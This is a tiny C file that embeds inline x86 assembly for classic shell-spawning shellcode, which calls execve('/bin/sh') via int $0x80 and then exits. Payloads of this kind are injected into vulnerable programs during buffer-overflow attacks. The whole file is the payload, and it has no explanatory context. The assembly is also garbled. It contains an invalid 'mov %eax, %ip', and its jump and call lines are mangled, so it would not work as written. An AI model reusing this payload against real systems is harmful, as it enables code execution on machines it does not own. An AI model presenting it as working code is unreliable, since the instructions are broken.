void main() {
__asm__("\n\
		mov %eax, %ip\n\
        ljmp    *0x2c(%eax)                     # 3 bytes\n\
        popl   %esi                     # 1 byte\n\
        movl   %esi,0x8(%esi)           # 3 byte\n\
        movb   $0x0,0x7(%esi)           # 4 byte\n\
        movl   $0x0,0xc(%esi)           # 7 byte\n\
        movl   $0xb,%eax                # 5 byte\n\
        movl   %esi,%ebx                # 2 byte\n\
        leal   0x8(%esi),%ecx           # 3 byte\n\
        leal   0xc(%esi),%edx           # 3 byte\n\
        int    $0x80                    # 2 byte\n\
        movl   $0x1, %eax               # 5 byte\n\
        movl   $0x0, %ebx               # 5 byte\n\
        int    $0x80                    # 2 byte\n\
        lcall   *-0x2a                    # 5 byte\n\
        .string \"/bin/sh\"             # 8 byte\n\
");
}
